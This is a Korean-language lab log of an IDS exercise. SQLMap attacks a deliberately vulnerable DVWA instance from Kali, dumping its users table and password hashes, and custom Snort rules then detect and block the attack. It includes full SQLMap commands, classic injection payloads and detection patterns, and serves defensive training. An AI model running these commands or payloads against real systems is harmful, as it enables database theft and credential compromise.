# 📄 2026.01.20 (Day 60) - Security Onion IDS/IPS 구축 및 Snort 룰 작성
...
# 2. DVWA 로그인 및 Security Level 설정
# http://[Metasploitable2_IP]/dvwa
# ID: admin / PW: password
# DVWA Security 메뉴 > Security Level을 "Low"로 설정
# 이유: 취약점 테스트를 위해 모든 보안 메커니즘 비활성화
...
# 5. 스캔 전 Metasploitable2 웹 로그 초기화 (정확한 분석 위해)
# Metasploitable2 터미널:
cd /var/log/apache2
...
**실습 환경:**
- Kali Linux (공격자)
- Metasploitable2 DVWA (피해자)
- Security Level: **Low**

**실습 단계:**
```bash
# 0. DVWA Security Level 확인
# DVWA 웹 페이지 > DVWA Security 메뉴 > "Low"로 설정 확인

# 1. DVWA SQL Injection 페이지 접속
# http://[Metasploitable2_IP]/dvwa/vulnerabilities/sqli/
# User ID 입력란에 "1" 입력 후 Submit
# URL: http://192.168.x.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#

# 2. 브라우저에서 쿠키 값 확인
# F12 (개발자 도구) > Application (또는 Storage) > Cookies
# PHPSESSID와 security 쿠키 값 복사
# 예: PHPSESSID=abcd1234; security=low

# 3. Kali Linux에서 SQLMap 기본 취약점 테스트
sqlmap -u "http://192.168.x.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abcd1234; security=low"

# 결과: SQL Injection 취약점 발견 메시지 확인
# Parameter 'id' is vulnerable. Injection type: UNION query
...
# 결과 예시: current database: 'dvwa'

# 5. 데이터베이스 내 테이블 목록 조회
sqlmap -u "http://192.168.x.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abcd1234; security=low" \
       -D dvwa --tables
...
# 6. users 테이블 데이터 전체 덤프
sqlmap -u "http://192.168.x.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abcd1234; security=low" \
       -D dvwa -T users --dump

# 결과: user_id, first_name, last_name, user, password (해시), avatar 등 출력
# 예시:
# +----+-------+----------+---------+----------------------------------+
...
# 7. SQLMap이 자동으로 MD5 해시 크랙 시도 (선택사항)
# --passwords 옵션 사용 시 비밀번호 해시 크랙 시도
```
...
```
탐지 패턴 (IDS/WAF):
- UNION SELECT 문자열 반복 출현
- 비정상적으로 긴 쿼리 파라미터
- ' OR 1=1--, ' AND '1'='1 등 전형적인 페이로드
- 짧은 시간 내 대량의 SQL 에러 발생
...
**실습 환경:**
- Kali Linux (공격자)
- Metasploitable2 DVWA (피해자, Security Level: Low)
...
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SQLMap Automatic SQL Injection Tool Detected";
    flow:to_server,established;
    content:"User-Agent|3a| sqlmap/"; nocase; http_header;
    classtype:web-application-attack;
    sid:3202501210; rev:1;
    reference:url,sqlmap.org;
)

alert tcp any any -> any $HTTP_PORTS (
    msg:"SQL Injection - UNION SELECT Pattern";
    flow:to_server,established;
    content:"union"; nocase; http_uri;
    content:"select"; nocase; distance:0; within:20; http_uri;
    pcre:"/union\s+select/Ui";
    classtype:web-application-attack;
    sid:3202501211; rev:1;
)

alert tcp any any -> any $HTTP_PORTS (
    msg:"SQL Injection - Boolean Based Blind";
    flow:to_server,established;
    pcre:"/(\' OR 1=1--|AND 1=1)/Ui";
    http_uri;
    classtype:web-application-attack;
    sid:3202501212; rev:1;
)

# 3. 룰 적용
sudo rule-update
# 문법 오류 시: sudo nsm --sensor --restart --only-snort-alert

# === Kali에서 SQLMap 공격 실행 ===

# 4. Kali Linux 터미널에서 SQLMap 실행
sqlmap -u "http://192.168.x.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abcd1234; security=low" \
       --current-db

# === Security Onion에서 탐지 확인 ===
...
# 6. 이벤트 상세 분석
# 이벤트 우클릭 > Transcript 선택
# HTTP 요청 전문 확인:
# GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT null,null-- HTTP/1.1
# User-Agent: sqlmap/1.7.2#stable
# Cookie: PHPSESSID=abcd1234; security=low

# 7. Wireshark로 패킷 분석
# 이벤트 우클릭 > Wireshark
# 전체 TCP 스트림 재구성하여 공격 전 과정 확인

# === 대응 조치 ===

# 8. 공격자 IP 차단 (iptables)
sudo iptables -A INPUT -s 192.168.x.x -j DROP

# 9. DVWA Security Level 상향 조정
# DVWA 웹 페이지 > DVWA Security > "High"로 변경
# Prepared Statement로 SQL Injection 방어 확인

# 10. 침해 흔적 조사
# Metasploitable2에서 웹 로그 분석
tail -f /var/log/apache2/access.log | grep "union"
tail -f /var/log/apache2/access.log | grep "sqlmap"
```
...
1. 공격 발생 (Kali SQLMap 실행)
   └─ HTTP GET 요청에 SQL Injection 페이로드 포함

2. IDS 탐지 (Security Onion Snort)
   └─ 커스텀 룰에 매칭되어 Alert 생성

3. 이벤트 확인 (Sguil)
   └─ 보안 분석가가 실시간 알림 확인

4. 상세 분석 (Wireshark, 로그)
   └─ 공격 벡터, 페이로드, 피해 범위 파악
